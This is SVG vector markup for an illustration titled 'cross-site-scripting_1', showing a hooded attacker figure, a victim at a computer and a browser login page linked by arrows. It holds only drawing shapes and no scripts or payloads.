<svg xmlns="http://www.w3.org/2000/svg" width="781" height="440" viewBox="0 0 781 440"><title>cross-site-scripting_1</title><path d="M75.46,120.27c-5.5,3.24-6.75,12-6,18.14-2.91-.12-3.95-3.87-6.95.13-4.25,15.41,6.2,16.5,7.95,17,0,2,2.38,10.62,5.25,14.62,2.69,3.75,10,12.85,23,12.85s22.36-13.92,23.63-16.23c1.5-2.74,4.53-7.18,4.78-11.18,9.75-4.5,9-18,6.58-19.38-2.75-1.56-5.74-.71-6.61,1.57,1.75-5-14.41-15.75-34.88-14-11.59,1-17.84-4.66-20.39-7.63-1.51-1.75-5-5-5.27-6.62-.71-3.75,10.91-14,38-10.13s32.11,23.5,33.12,29.75c2.14,13.21-3.76,22.13-6.25,28" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M80.48,175.63s2.92,8.16,1,15.38c-1.88,7-10.75,8-25,11-8.58,1.17-26.25,36.76-26.25,50.56,0,6.5,18.71,40.33,18.71,40.33" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M115.07,175.63A23.64,23.64,0,0,0,114,191c2.1,7,10.75,8,25,11,16.88,6.54,24.21,43.32,27.55,55.16-1.83,10-19.2,35.73-19.2,35.73" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M97.48,198.76c.39,0,.78,0,1.16,0,7.5-.16,11.72-1.9,16-5.36,2.33,2.61,6.85,6.12,8.94,5.37s-11.13,9.75-26.14,8.75-21-5.19-23.27-9.47c2.9-1.22,5.89-2.27,6.57-4.65C85,198,92,199.09,97.48,198.76Z" fill="#4c5054" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polygon points="135.31 228.23 63.64 228.23 63.46 217.71 135.31 216.68 135.31 228.23" fill="#4c5054"/><polygon points="138.21 241.28 60.16 241.28 59.95 237.71 137.09 237.71 138.21 241.28" fill="#4c5054"/><polyline points="152.03 285.62 160.48 285.62 147.34 313.37 49.53 313.37 34.47 285.62 43.85 285.62" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polygon points="40.91 241.07 155.36 241.07 144.19 313.37 52.09 313.37 40.91 241.07" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polyline points="34.47 285.62 49.53 317.61 147.34 317.61 160.48 285.62" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M46.19,214c2.86,5.61,15.24,14.06,17.45,14.24s2.91-9.74,2.91-9.74c-7.44-3.78-12.84-8.14-14.63-13.15Z" fill="#4c5054"/><path d="M40.16,222.48c4.64,5.92,24.14,16.78,26.39,16.2-.51,1.58-2.92,2.6-3.75,2.6.33.35-17.25-.93-17.25-.93s-11-5.41-10-7.84C36.7,229.69,40.58,222.42,40.16,222.48Z" fill="#4c5054"/><path d="M31.26,245.33c1.41,1.17,9.58,4.32,10.93,4-.06.81,1.11,9.64,1.11,9.64s-11.24.48-12.83-1.84C30.71,254.35,31.26,245.33,31.26,245.33Z" fill="#4c5054"/><path d="M36.75,269.48c5.4.1,8.33-1.4,8.2-2.29s1.17,7.56,1.17,7.56,3.59,4.2-4.33,4.78C39.05,277,36.75,269.48,36.75,269.48Z" fill="#4c5054"/><path d="M150.83,214c-2.85,5.61-13.3,14.06-15.52,14.24s-5.84-8.84-5.84-8.84c7.5-2.16,13.84-9,15.64-14Z" fill="#4c5054"/><path d="M156.11,223.68c-4.63,5.92-19.63,15.17-21.88,14.58.5,1.59-.84,3,0,3-.34.35,17.25-.93,17.25-.93s9.25-4.45,8.25-6.89C158.57,230.65,155.7,223.62,156.11,223.68Z" fill="#4c5054"/><path d="M163.56,246.1c-1.42,1.16-7.37,3.55-8.73,3.27.06.81-1.1,9.64-1.1,9.64s11.23.48,12.82-1.84C166.31,254.35,163.56,246.1,163.56,246.1Z" fill="#4c5054"/><path d="M161.79,268.93c-5.4.09-9.85-.85-9.71-1.74s-1.17,7.56-1.17,7.56-2.57,3.46,5.35,4C159,276.25,161.79,268.93,161.79,268.93Z" fill="#4c5054"/><path d="M94,166.05c8.89,1.09,8.34,0,14.75-4.62" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M112.68,131.91c-6.64,0-8,8.54-14.86,9s-8.11-9-14.87-8.87c-4.82.12-7.63,2.21-9.22,4.67-.72,1.12-6-5.09-6.33-4-.35,1.34,4.39,10,4.42,10.83.13,4,2.13,8.84,12.13,9.22s8.12-9.25,13.88-9.22,1.94,7.43,16,7.59c5,.06,9.5-1.5,10-9.75,0-.44,4-6.6,4-7,0-1.92-4.34,2.33-5,1.18C121.17,132.53,117.42,131.92,112.68,131.91ZM83.4,145.29c-2.18,0-3.94-.95-3.94-2.13S81.22,141,83.4,141s3.94,1,3.94,2.12S85.57,145.29,83.4,145.29Zm29.28,0c-2.17,0-3.93-.95-3.93-2.13s1.76-2.12,3.93-2.12,3.94,1,3.94,2.12S114.86,145.29,112.68,145.29Z" fill="#4c5054"/><polyline points="131.46 157.16 142.34 203.78 119.71 196.04 125.31 162.3 131.46 157.16" fill="#4c5054" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polygon points="292.87 144.74 301.76 150.63 292.84 156.75 292.87 144.74" fill="#cbd0d1"/><polyline points="48.53 296.34 20.71 296.89 20.71 380.6 482.96 380.6 482.96 350.13 618.41 350.13 618.41 406.32 583.91 406.32 583.91 386.6 644.52 386.6 644.52 294.2" fill="none" stroke="#d60000" stroke-miterlimit="10"/><polyline points="443.36 179.26 476.78 179.21 476.78 166.81 461 166.47 461 146.84 513.64 146.84 513.64 207.26 530.38 207.26 531.05 178.02 579.05 178.02" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-dasharray="6 6"/><rect x="615.21" y="132" width="113.97" height="161.3" fill="none" stroke="#0071bc" stroke-miterlimit="10" stroke-width="2"/><rect x="583.91" y="104.37" width="175.16" height="27.63" fill="#d0f1f7" stroke="#0071bc" stroke-miterlimit="10" stroke-width="2"/><line x1="676.67" y1="118.08" x2="690.01" y2="118.08" fill="none" stroke="#0071bc" stroke-miterlimit="10" stroke-width="2"/><line x1="696.33" y1="118.08" x2="709.67" y2="118.08" fill="none" stroke="#0071bc" stroke-miterlimit="10" stroke-width="2"/><line x1="715.84" y1="118.08" x2="729.18" y2="118.08" fill="none" stroke="#0071bc" stroke-miterlimit="10" stroke-width="2"/><line x1="735.5" y1="118.08" x2="748.84" y2="118.08" fill="none" stroke="#0071bc" stroke-miterlimit="10" stroke-width="2"/><rect x="627.73" y="143.46" width="89.35" height="57.53" fill="none" stroke="#0071bc" stroke-miterlimit="10" stroke-width="2"/><rect x="626.61" y="209.71" width="21.9" height="2.89" fill="#0071bc"/><line x1="626.61" y1="221.24" x2="666.9" y2="221.24" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><line x1="626.61" y1="228.02" x2="666.9" y2="228.02" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><line x1="626.61" y1="234.05" x2="666.9" y2="234.05" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><line x1="626.61" y1="240" x2="653.52" y2="240" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><rect x="626.14" y="247.68" width="27.9" height="19.68" fill="#d0f1f7"/><rect x="658.1" y="247.68" width="27.9" height="19.68" fill="#d0f1f7"/><rect x="689.79" y="247.68" width="27.9" height="19.68" fill="#d0f1f7"/><polygon points="480.21 141.16 489.17 146.94 480.32 153.16 480.21 141.16" fill="#d60000"/><polygon points="300.77 386.6 291.91 380.67 300.87 374.6 300.77 386.6" fill="#d60000"/><polygon points="72.32 386.6 63.46 380.67 72.42 374.6 72.32 386.6" fill="#d60000"/><rect x="124.4" y="337.86" width="104.93" height="24.27" rx="12.13" ry="12.13" fill="#edd6d6" stroke="#d60000" stroke-miterlimit="10"/><rect x="63.46" y="399.52" width="125.75" height="24.27" rx="11.79" ry="11.79" fill="#edd6d6" stroke="#d60000" stroke-miterlimit="10"/><rect x="255.73" y="399.02" width="197.03" height="24.27" rx="12.01" ry="12.01" fill="#edd6d6" stroke="#d60000" stroke-miterlimit="10"/><rect x="304.39" y="335.16" width="129.8" height="24.27" rx="12.13" ry="12.13" fill="#edd6d6" stroke="#d60000" stroke-miterlimit="10"/><polyline points="403.43 380.6 403.43 370.36 366.46 370.36 366.46 359.94" fill="none" stroke="#d60000" stroke-miterlimit="10"/><polyline points="424.69 398.52 424.69 389.08 452.76 389.08 452.76 380.6" fill="none" stroke="#d60000" stroke-miterlimit="10"/><polyline points="196.88 380.6 196.88 392.56 151.12 392.56 151.12 399.52" fill="none" stroke="#d60000" stroke-miterlimit="10"/><polyline points="229.33 350.13 242 350.13 242 380.6" fill="none" stroke="#d60000" stroke-miterlimit="10"/><polyline points="70.09 158.18 64.66 158.18 56.01 202.11 77.55 196.58 70.09 158.18" fill="#4c5054" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M62.51,138.54c3-4,4-.25,6.95-.13-.7-5.68.34-13.64,4.88-17.35l-7.79-10.15c-3.59,1.63-17.84,23-2.21,46.25l5.75,2.38.5-2.83a8.2,8.2,0,0,1-.13-1.17C68.71,155,58.26,154,62.51,138.54Z" fill="#4c5054" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M137.71,129.16c-1-6.25-6-25.87-33.12-29.75s-38.75,6.38-38,10.13c.31,1.64,3.76,4.87,5.27,6.62,2.55,3,8.8,8.62,20.39,7.63,20.47-1.75,36.63,9,34.88,14,.87-2.28,3.86-3.13,6.61-1.57,2.35,1.34,3.11,13.84-5.48,18.81l3.24,2.13C134,151.29,139.85,142.37,137.71,129.16Z" fill="#4c5054" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polygon points="133.76 161.43 126.18 161.43 128 155.91 133.76 155.91 133.76 161.43" fill="#fff" stroke="#4c5054" stroke-miterlimit="10"/><polygon points="71.5 162.3 63.31 162.3 63.31 156.78 70.09 156.78 71.5 162.3" fill="#fff" stroke="#4c5054" stroke-miterlimit="10"/><path d="M111.16,281.74l.35-.07h0c.35-.06.69-.1,1-.14l.17,0c.08,0,.3,0,.37-.05h.06l.33-.06h0a3.75,3.75,0,0,0,.8-.25,1.67,1.67,0,0,0,.86-.93,1.47,1.47,0,0,0,.11-.93,1.5,1.5,0,0,0-.65-.82,1.88,1.88,0,0,0,0-.62,1.62,1.62,0,0,0-1.12-1.31,2.08,2.08,0,0,0-.41-.05,2,2,0,0,0-1.51.83,4.66,4.66,0,0,1-1.43,1.14l-.74.35v0s-.28.12-.52.23l-1.52.68c.28-4.33,2.21-8,.17-10.8s-5.8-3.51-9.39-3.58h-.87a16.55,16.55,0,0,0-5.3.89l-.19.07a7.73,7.73,0,0,0-3.44,2.48c-1.69,2.22-.41,4.93.29,8l.08.36a14,14,0,0,1,.3,2.36v.57a5.06,5.06,0,0,0,.56,2.37,32.83,32.83,0,0,0-4.76-1.76c-1.94-.5-3.57-.19-3.66-1.83a.93.93,0,0,1,.67-.72,1.41,1.41,0,0,0,.51.65,1.46,1.46,0,0,1,.38-2.39c1.25-.24,1.18,1,2.93,2,1,.52,2.1,1.09,3.37,1.68v-.56c-1.17-.55-2.25-1.09-3.12-1.57a3.36,3.36,0,0,1-.54-.34l-.15-.12a6.8,6.8,0,0,1-.71-.72,1.93,1.93,0,0,0-1.46-.9,2.06,2.06,0,0,0-.42,0,1.63,1.63,0,0,0-1.17,1.26,2.25,2.25,0,0,0-.08.62,1.34,1.34,0,0,0-.72,1.1,1.76,1.76,0,0,0,1,1.59,5.14,5.14,0,0,0,1.73.45c.44.07.89.14,1.36.26a38.08,38.08,0,0,1,5.36,2h0a10.19,10.19,0,0,0,1.74,1.78l.08.06.32.26.18.18-.12.05-.83.29-.11,0a37.68,37.68,0,0,1-5,1.4,24.62,24.62,0,0,1-2.7.31,6.91,6.91,0,0,0-2.13.34,1.76,1.76,0,0,0-1.08,1.64,2,2,0,0,0,.45,1.41,1.69,1.69,0,0,0,.75.49,2.53,2.53,0,0,0,0,.73,1.58,1.58,0,0,0,1,1.21,2.52,2.52,0,0,0,.87.2,1.64,1.64,0,0,0,.6-.1l.36-.16a5.64,5.64,0,0,0,1-.84,11.12,11.12,0,0,1,2.32-1.81,30.94,30.94,0,0,1,4.16-1.87l1-.38.44-.16h0l.36-.13.09,0a7.47,7.47,0,0,0,.63.56,5.91,5.91,0,0,0,3.53.92c2.11,0,3.25-.52,4-1.26h0c1.17.48,2.36,1,3.45,1.5.49.22,1.76.91,1.76.91l.58.34A10.83,10.83,0,0,1,110,293c.62.65,1.11,1.16,1.92,1.17a2.26,2.26,0,0,0,.88-.16,1.49,1.49,0,0,0,.84-.74,1.83,1.83,0,0,0,.19-.65,2.18,2.18,0,0,0,0-.51h0a1.72,1.72,0,0,0,.71-.45,2,2,0,0,0,.51-1.39,1.75,1.75,0,0,0-1-1.68,6.78,6.78,0,0,0-2.11-.43l-.47-.05-.75-.09-.28,0v0c-.37-.06-.77-.13-1.18-.23a27.4,27.4,0,0,1-3.26-1l-.78-.28-1.78-.69h0l.18-.21a7.93,7.93,0,0,1,.73-.53c.36-.25,1.34-1,1.34-1a5.88,5.88,0,0,0,.61-.69h0c.33-.13.66-.26,1-.37l.11,0q.89-.33,1.71-.6l.08,0C109.91,282.05,110.57,281.87,111.16,281.74Zm-18,6.11h0l-.6.22-.52.2-.44.17h0a34.86,34.86,0,0,0-3.32,1.42s0,0-.16.08-.46.24-.67.37c-2.87,1.64-3,3.38-4.71,2.68-1-.39-.77-2-.14-2.58a1.48,1.48,0,0,0-.52.69,1.31,1.31,0,0,1-1.2-1.44c.15-1.88,2-1.24,5.22-1.78l.14,0,.14,0A43.78,43.78,0,0,0,92.66,286l.08,0,.05.09c.29.47.45,1.07.77,1.66h0Zm4.55,1.64h0Zm.13-.59.08-.11A.76.76,0,0,1,97.85,288.9Zm7.2-1.93.55.2h0l.21.07h0l.11.05h0l.44.16a27.5,27.5,0,0,0,2.76.81,15.27,15.27,0,0,0,1.56.28l.44.06,1,.1h.07c1.5.17,2.34.33,2.39,1.59a1.29,1.29,0,0,1-1.24,1.39,1.45,1.45,0,0,0-.5-.7,2.05,2.05,0,0,1,.37,1.94l0,0a1,1,0,0,1-.59.58c-1.78.63-1.8-1.1-4.6-2.86l-.65-.39c-.46-.26-2-1-2-1-1-.47-2.06-.92-3.12-1.35a13.85,13.85,0,0,0,.91-1.72Zm.2-3.18h0Zm1.48-3.8c0,.18,0,.37,0,.57s0,.27,0,.41a3.42,3.42,0,0,1-.54,1.89,3.37,3.37,0,0,1-1,.95c-.91.57-1.94.75-2.32,1.11a2.09,2.09,0,0,0-.35.49,4.89,4.89,0,0,0-.2.46,3.75,3.75,0,0,1-.51.94,2.94,2.94,0,0,1,0,.93.66.66,0,0,1-.36.33l-.11,0-.12-.05a1,1,0,0,1-.1-.59v-.08l-.06,0v0a5.18,5.18,0,0,1,0,.55c.05.43-.56.8-.6-.24a.71.71,0,0,1,0-.14l-.11,0v.08c0,.51.15,1-.35,1.09s-.41-.37-.36-1.05l-.3,0c0,.56.28,1.23-.49,1.22a.87.87,0,0,1-.31-.05c-.27-.11-.25-.55-.25-.55,0-.17,0-.37,0-.59h-.31c0,.49.21,1.05-.3,1.15h-.19c-.72,0-.57-.47-.51-1.22l-.23,0c0,.53.08,1.12-.35,1s-.4-.45-.36-1.13l-.1,0c0,.44,0,.83-.3.77s-.33-.31-.31-.74c0-.07,0-.13,0-.2l-.06,0a1.66,1.66,0,0,1,0,.24c0,.68-.4.3-.56.2a.56.56,0,0,1-.27-.45.81.81,0,0,1,0-.22v-.27a2.21,2.21,0,0,1-.46-.63l0,0c-.11-.21-.2-.43-.31-.64a2.27,2.27,0,0,0-.27-.44l-.08-.09c-.32-.36-1.23-.68-2.07-1.28a4.15,4.15,0,0,1-1-1,3.5,3.5,0,0,1-.61-2.15v-.23c0-.19,0-.38,0-.57l0-.34a9.89,9.89,0,0,1,.61-2.27,0,0,0,0,1,0,0h0c0-.09.08-.19.13-.28l.07-.16v0c1.07-2.24,1.24-4,.86-5.06l-.28-.33c-.16.36-.46,1.85-1,3.72l0,.19c-.13.49-.28,1-.43,1.51a.76.76,0,0,0,0,.11l-.14.54-.07.28c0-.11,0-.22-.07-.33l-.14-.6c-.66-2.66-1.53-5-.09-6.94a8.35,8.35,0,0,1,1.95-1.89s1.07-.68,1.33-.81a12.35,12.35,0,0,1,10.58-.35.24.24,0,0,1,.21.1,9.55,9.55,0,0,1,3.87,3.07,4.84,4.84,0,0,1,.45.79l.1.26c.7,1.91.07,4.16-.38,6.71,0-.2-.09-.4-.14-.6-.52-2-.84-3.8-1.05-4.79l-.07-.33c-.08-.34-.14-.5-.18-.43a2,2,0,0,0-.19.35,6.13,6.13,0,0,0-.22.81,8.41,8.41,0,0,0,.86,4.33,9.44,9.44,0,0,1,.7,2.71C106.74,279.84,106.74,279.91,106.73,280Zm.85,2.32-.18.06-.64.24a5,5,0,0,0,.52-2.18v-.14c.45-.19.88-.37,1.29-.56l.66-.3c.38-.18.75-.35,1.08-.52,1.8-.89,1.77-2.16,3-1.87a1.47,1.47,0,0,1,.28,2.4,1.39,1.39,0,0,0,.53-.63.9.9,0,0,1,.64.74c-.09.94-.65,1.22-1.49,1.37l-.6.08c-.37.05-.77.09-1.19.16h0l-.42.08A27.58,27.58,0,0,0,107.58,282.31Z" fill="#4c5054"/><path d="M99.5,284.17c0-.21-.07-.44-.12-.7-.23-1.21-1-2.25-1.37-2.26S97,282,96.67,283a2.12,2.12,0,0,0-.11.45l0,.05a14.12,14.12,0,0,0-.27,2.06c0,.46.17.41.39.17l.2-.24.08-.11h0l0-.06h0l.09-.12c.3-.38.62-.78.87-.77s.42.24.65.53l.2.25c.57.75,1.06,1.49.8-.42C99.57,284.58,99.54,284.39,99.5,284.17Z" fill="#4c5054"/><path d="M97.09,277.68c-.15-.92-1.14-.93-3.9-1.43a1.7,1.7,0,0,0-.45,0h-.07l-.21.05-.25.1a3.31,3.31,0,0,0-1.54,2.95v0a3,3,0,0,0,.06.59v0h0a3.39,3.39,0,0,0,.11.43.19.19,0,0,0,0,.07,2,2,0,0,0,.38.67,2.07,2.07,0,0,0,.7.51,5,5,0,0,0,1.51.26,3.65,3.65,0,0,0,.55-.05h.12a4.7,4.7,0,0,0,.74-.18A3.36,3.36,0,0,0,97.09,277.68Z" fill="#4c5054"/><path d="M105.27,278.34l0,0a2.86,2.86,0,0,0-.15-.41h0l-.07-.17a2.65,2.65,0,0,0-.24-.4v0h0a1.87,1.87,0,0,0-1.78-.93l-.88.12h-.06l0,0h0l0,0c-2.07.27-2.85.34-3,1.15a3.36,3.36,0,0,0,2.08,4.1,4.7,4.7,0,0,0,2.35.25,3.24,3.24,0,0,0,.7-.22l.11-.05.05,0h0l.18-.11.27-.24.06-.07a1.91,1.91,0,0,0,.32-.56,3.79,3.79,0,0,0,.13-2.25Z" fill="#4c5054"/><path d="M603.85,120.72a3.62,3.62,0,0,1-.27,1.41,3.2,3.2,0,0,1-.8,1.13,4.26,4.26,0,0,1-1.32.8,6.41,6.41,0,0,1-1.82.41v2.08h-1.38v-2c-.45,0-.86,0-1.24-.08a8.1,8.1,0,0,1-1.06-.17,7,7,0,0,1-1-.27c-.29-.1-.59-.22-.88-.35V121c.28.14.59.27.92.4s.69.24,1,.35.72.19,1.09.27a8.19,8.19,0,0,0,1.08.14v-3.22l-.18-.07-.16-.06-.14-.05a11.63,11.63,0,0,1-1.61-.74,4.48,4.48,0,0,1-1.14-.86,3,3,0,0,1-.69-1,3.54,3.54,0,0,1-.23-1.3,3.25,3.25,0,0,1,.29-1.38,3.1,3.1,0,0,1,.82-1.08,4.16,4.16,0,0,1,1.31-.75,6.77,6.77,0,0,1,1.73-.38v-1.59h1.38v1.53a11.45,11.45,0,0,1,1.8.25,11.17,11.17,0,0,1,1.93.64l-1,2.36c-.44-.17-.89-.33-1.37-.47a7.1,7.1,0,0,0-1.34-.25v3l.39.14a15.3,15.3,0,0,1,1.68.73,5.09,5.09,0,0,1,1.2.84,3,3,0,0,1,.7,1A3.45,3.45,0,0,1,603.85,120.72Zm-6.7-6a1.17,1.17,0,0,0,.27.79,1.87,1.87,0,0,0,.84.53v-2.35a1.51,1.51,0,0,0-.83.3A.93.93,0,0,0,597.15,114.72Zm3.65,6.06a1.33,1.33,0,0,0-.06-.42,1.24,1.24,0,0,0-.57-.61,3.69,3.69,0,0,0-.53-.27V122a1.48,1.48,0,0,0,.88-.4A1.18,1.18,0,0,0,600.8,120.78Z" fill="#0071bc"/><rect x="671.96" y="209.71" width="21.9" height="2.89" fill="#0071bc"/><line x1="671.96" y1="221.24" x2="712.25" y2="221.24" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><line x1="671.96" y1="228.02" x2="712.25" y2="228.02" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><line x1="671.96" y1="234.05" x2="712.25" y2="234.05" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><line x1="671.96" y1="240" x2="698.87" y2="240" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><line x1="626.61" y1="274.61" x2="717.69" y2="274.61" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><line x1="626.61" y1="280.64" x2="717.69" y2="280.64" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><line x1="626.61" y1="286.59" x2="696.33" y2="286.59" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><rect x="661.72" y="153.61" width="47.38" height="8.5" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><rect x="661.72" y="167.14" width="47.38" height="8.5" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><rect x="641.85" y="180.37" width="61.15" height="16.21" fill="#d0f1f7"/><path d="M650.39,193.76V183.28h2.23v8.65h3.81v1.83Z" fill="#0071bc"/><path d="M667.05,188.51a8,8,0,0,1-.29,2.2,4.59,4.59,0,0,1-.86,1.71,4,4,0,0,1-1.47,1.1,5.8,5.8,0,0,1-4.18,0,3.84,3.84,0,0,1-1.46-1.1,4.59,4.59,0,0,1-.86-1.71,8.12,8.12,0,0,1-.29-2.22,8,8,0,0,1,.29-2.21,4.62,4.62,0,0,1,.86-1.7,3.81,3.81,0,0,1,1.47-1.08,5.18,5.18,0,0,1,2.1-.39,5.11,5.11,0,0,1,2.08.39,3.72,3.72,0,0,1,1.46,1.09,4.55,4.55,0,0,1,.86,1.7A8,8,0,0,1,667.05,188.51Zm-7.12,0a7.37,7.37,0,0,0,.14,1.48,3.49,3.49,0,0,0,.45,1.11,2.07,2.07,0,0,0,.74.7,2.57,2.57,0,0,0,2.17,0,2,2,0,0,0,.75-.7,3.48,3.48,0,0,0,.43-1.11,7.37,7.37,0,0,0,.14-1.48,7.47,7.47,0,0,0-.14-1.49,3.48,3.48,0,0,0-.43-1.11,1.91,1.91,0,0,0-.74-.7,2.16,2.16,0,0,0-1.08-.25,2.22,2.22,0,0,0-1.09.25,1.93,1.93,0,0,0-.75.7,3.49,3.49,0,0,0-.45,1.11A7.47,7.47,0,0,0,659.93,188.51Z" fill="#0071bc"/><path d="M673.19,187.87h4.16v5.44l-.84.25c-.28.07-.57.13-.88.18s-.62.09-1,.12-.69,0-1.06,0a5.81,5.81,0,0,1-2.08-.35,3.91,3.91,0,0,1-1.53-1,4.59,4.59,0,0,1-.94-1.7,7.44,7.44,0,0,1-.32-2.32,6.48,6.48,0,0,1,.35-2.23,4.5,4.5,0,0,1,2.78-2.78,6.76,6.76,0,0,1,2.34-.37,7.58,7.58,0,0,1,1.65.18,8.73,8.73,0,0,1,1.47.46l-.74,1.78a6.15,6.15,0,0,0-1.1-.41,5,5,0,0,0-1.29-.16,3.27,3.27,0,0,0-1.32.25,2.88,2.88,0,0,0-1,.72,3.19,3.19,0,0,0-.63,1.13,4.53,4.53,0,0,0-.23,1.47,5.77,5.77,0,0,0,.16,1.42,3.14,3.14,0,0,0,.48,1.1,2.23,2.23,0,0,0,.85.73,2.81,2.81,0,0,0,1.25.26,6,6,0,0,0,.8-.05l.61-.1v-2.19h-2Z" fill="#0071bc"/><path d="M683.77,193.76H679V192.5l1.28-.59v-6.78l-1.28-.59v-1.26h4.77v1.26l-1.28.59v6.78l1.28.59Z" fill="#0071bc"/><path d="M694.42,193.76H691.6l-4.12-7.93h-.07c0,.37.06.73.08,1.1s0,.63,0,1,0,.65,0,.92v4.93h-2V183.28h2.81l4.11,7.85h0c0-.36,0-.72,0-1.08,0-.15,0-.3,0-.47s0-.32,0-.48,0-.31,0-.46v-5.36h2Z" fill="#0071bc"/><line x1="635.06" y1="158.76" x2="656.43" y2="158.76" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><line x1="635.06" y1="172.02" x2="656.43" y2="172.02" fill="none" stroke="#0071bc" stroke-miterlimit="10"/><polyline points="324.3 35.36 324.3 98.55 275.22 98.55 275.22 149.59 296.39 149.59" fill="none" stroke="#cbd0d1" stroke-miterlimit="10"/><polygon points="206.91 166.49 212.84 157.63 218.91 166.59 206.91 166.49" fill="#cbd0d1"/><polygon points="189.22 238.69 195.1 229.8 201.22 238.73 189.22 238.69" fill="#cbd0d1"/><polygon points="573.59 172.02 582.55 177.8 573.7 184.02 573.59 172.02" fill="#d60000"/><polygon points="650.52 333.38 644.74 342.34 638.52 333.49 650.52 333.38" fill="#d60000"/><polygon points="553.15 355.8 544.19 350.02 553.04 343.8 553.15 355.8" fill="#d60000"/><rect x="17.13" y="17.43" width="732.19" height="30" fill="#ebf0f2" stroke="#4c5054" stroke-miterlimit="10"/><line x1="442.02" y1="168.46" x2="583.91" y2="168.46" fill="none" stroke="#dce3e5" stroke-miterlimit="10"/><line x1="441.14" y1="188.52" x2="583.91" y2="188.52" fill="none" stroke="#dce3e5" stroke-miterlimit="10"/><rect x="583.91" y="132" width="175.16" height="161.3" fill="none" stroke="#0071bc" stroke-miterlimit="10" stroke-width="2"/><ellipse cx="334.42" cy="140.19" rx="19.19" ry="15.76" transform="translate(141.98 447.52) rotate(-80.69)" fill="none" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><path d="M364,256.52l-3.89,8.65H325.94c-8.27,0-20.95-11.45-20.95-26.33V172.91l23.94,1.19" fill="none" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><polygon points="469.73 223.6 349.04 221.43 349.04 212.74 469.73 214.91 469.73 223.6" fill="#159c80"/><rect x="436.19" y="215.42" width="8.27" height="83.33" fill="#159c80"/><rect x="326.21" y="266.39" width="7.99" height="10.2" fill="none" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><circle cx="298.97" cy="295.55" r="5.15" fill="#159c80"/><circle cx="320.08" cy="306.75" r="4.72" fill="#159c80"/><rect x="349.04" y="265.17" width="8.27" height="23.52" fill="#159c80"/><polyline points="323.61 283.75 319.32 304.15 323.61 304.15 332.41 288.44 357.32 297.73 358.38 294.97 334.2 276.59 326.21 276.59 299.48 292.94 302.51 294.97 320.98 290.97" fill="#fff" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><circle cx="357.12" cy="297.79" r="4.65" fill="#159c80"/><path d="M322.21,155.34c-1.2,5.9-2.42,11.51-4,12" fill="none" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><path d="M336.72,158.46a88.63,88.63,0,0,1,0,8.89" fill="none" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><path d="M343.7,135.2c.78,4.87-5,4.9-4.08,8.62s2.32,13.66-6.76,14.71-14.21-3.38-16.45-5.86c-5.62-3.32-7.8-28.25,4.66-28.44,2.14-13,24.7-4.89,31.83-9.3,1.45,4.7-3.28,11.7-7.11,11.09S343.49,133.87,343.7,135.2Z" fill="#159c80" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><polygon points="318.8 162.16 339.75 163.76 341.11 169.94 317.79 168.43 318.8 162.16" fill="#fff" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><polygon points="355.18 214.45 358.06 208.76 423.79 209.51 426.55 215.34 355.18 214.45" fill="none" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><rect x="349.04" y="219.04" width="8.27" height="8.84" fill="#159c80"/><path d="M382.05,287.15c-6.39-.91-14.17-3.27-13.87-5.46-.34,4-11,1.68-11,1.68s-.65,6.62-.35,8.32c3.24,1.39,10.43,1.21,11.21,1.47S384.43,292.54,382.05,287.15Z" fill="#fff" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><rect x="376.06" y="215.42" width="8.27" height="63.49" fill="#159c80"/><rect x="461.47" y="215.42" width="8.27" height="71.96" fill="#159c80"/><path d="M405.89,192.43s9.18,11.34,5.5,22.28c-5.75,2.69-15,.71-15,.71,6.89-8.64,2.24-23.22,2.24-23.22" fill="#fff" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><path d="M336.71,189.84,361,212.77h29.77V200.9s-21.5-.55-24.25-2.34-12.39-17.44-23.14-27.91c-25.48-6.05-33,2.16-35.29,2.26,12,.75,20.89,1.19,20.89,1.19-.27,17.7,8.89,71.61,8.89,71.61s16.4.18,20.56,1.78c5.62,1.66,3.82,13,3.82,13l9,30.42,7.44-.55,3.92-4.36s-10.89-53.47-12.92-54.21c-7.87-2.88-16-3.35-20.9-3.6-6.2-.31-2.22-19-1.67-29.58" fill="#fff" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><path d="M406.28,212.37c0,1.69-3.48,3-7.78,3s-7.78-1.36-7.78-3,3.48-5.11,7.78-5.11S406.28,210.69,406.28,212.37Z" fill="#159c80"/><path d="M390.72,203.66c4.13.82,13.44,3.6,10.34,9.08l-9.93-1.4Z" fill="#fff" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><line 